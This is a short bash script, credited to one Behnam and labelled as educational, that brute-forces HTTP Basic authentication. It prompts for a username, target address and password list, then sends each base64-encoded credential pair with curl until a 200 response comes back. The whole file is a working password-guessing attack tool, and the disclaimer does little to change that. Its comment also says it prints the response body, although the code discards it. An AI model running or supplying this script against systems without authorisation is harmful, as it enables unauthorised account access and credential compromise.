#!/bin/bash

### DISCLAIMER!!! This script is only for education purpose. Brute forcing is not considered an ethical practice. ###
### Use only for eductional legit purpose on your own risk ###

# This script is to target a path with password brute force. It prompts to enter the username,target address 
# and the path to your passwordlist; then iterates over each password until it receives 200 response code 
# and prints the password used and response body 
# by Behnam, contact@behnam.io


read -p "Enter the username: " header_string
read -p "Enter target address: " target_address
read -p "Enter passwordlist file: " file_name

while read -r line; do
  encoded=$(echo -n "$header_string:$line" | base64)
  response=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Basic $encoded" $target_address)
  if [ "$response" -eq 200 ]; then
    echo "Successful response for line: $line"
    echo "Curl response: $response"
    break
  else
    echo "Unsuccessful response for line: $line"
    echo "Curl response: $response"
  fi
done < $file_name
